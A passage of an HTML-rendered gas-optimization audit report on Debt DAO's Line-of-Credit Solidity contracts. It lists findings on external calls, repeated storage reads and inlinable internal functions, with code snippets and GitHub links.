class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit getLatestAnswer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:                  </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getLatestAnswer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit status()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">173</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ILineOfCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">line</span><span class=\"mtk1\">).</span><span class=\"mtk11\">status</span><span class=\"mtk1\">() != </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">REPAID</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// if repaid, skip;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L35\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L35</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactoryLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit spigot()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">SecuredLine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldLine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">spigot</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit escrow()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">e</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">SecuredLine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldLine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">escrow</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit swapTarget()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">st</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">SecuredLine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldLine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">swapTarget</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit defaultRevenueSplit()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">split</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">SecuredLine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldLine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">defaultRevenueSplit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit init()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk11\">SecuredLine</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">line</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">init</span><span class=\"mtk1\">() != </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ACTIVE</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L48\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L48</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit safeTransfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit safeTransferFrom()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit balanceOf()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) :</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L46\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L46</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit claimEscrow()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">claimEscrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">claimToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit approve()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sellToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">swapTarget</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit updateOwner()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newLine</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit owner()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit getSetting()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">:          (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">split</span><span class=\"mtk1\">,, </span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transferFunc</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getSetting</span><span class=\"mtk1\">(</span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit updateOwnerSplit()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateOwnerSplit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">defaultSplit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit updateOwnerSplit()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateOwnerSplit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_SPLIT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit updateOwner()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(!</span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">)) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReleaseSpigotFailed</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit updateOwner()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(!</span><span class=\"mtk11\">ISpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">)) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReleaseSpigotFailed</span><span class=\"mtk1\">(); }</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L73\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L73</a></p>\n<h2 id=\"g05--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g05--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" aria-label=\"g05  state variables should be cached in stack variables rather than re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑05]  State variables should be cached in stack variables rather than re-reading them from storage</h2>\n<p>The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (<strong>100 gas</strong>) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.</p>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit count on line 499</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">502</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">count</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span><span class=\"mtk11\">_updateStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">REPAID</span><span class=\"mtk1\">); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit ids on line 172</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit ids on line 201</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">204</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit ids on line 517</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit ids on line 532</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">532</span><span class=\"mtk1\">:                  </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">nextQSpot</span><span class=\"mtk1\">];    </span><span class=\"mtk3\">// id put into old `p` position</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L502\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L502</a></p>\n<h2 id=\"g06--internal-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g06--internal-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"g06  internal functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑06]  <code>internal</code> functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs <strong>20 to 40 gas</strong> because of two extra <code>JUMP</code> instructions and additional stack operations needed for function calls.</p>\n<p><em>There are 4 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">167</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateOutstandingDebt</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">168           </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">169:          </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">principal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interest</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">435       </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_createCredit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">436           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">437           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">438           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">439       )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">440           </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">441:          </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">516:      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_sortIntoQ</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">p</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L167-L169\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L167-L169</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interest</span><span class=\"mtk1\">-</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterestRateCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_accrueInterest</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">43            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">44            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">drawnBalance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">45            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">facilityBalance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">46:       ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L42-L46\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L42-L46</a></p>\n<h2 id=\"g07--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" style=\"position:relative;\"><a href=\"#g07--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" aria-label=\"g07  add unchecked  for subtractions where the operands cannot underflow because of a previous 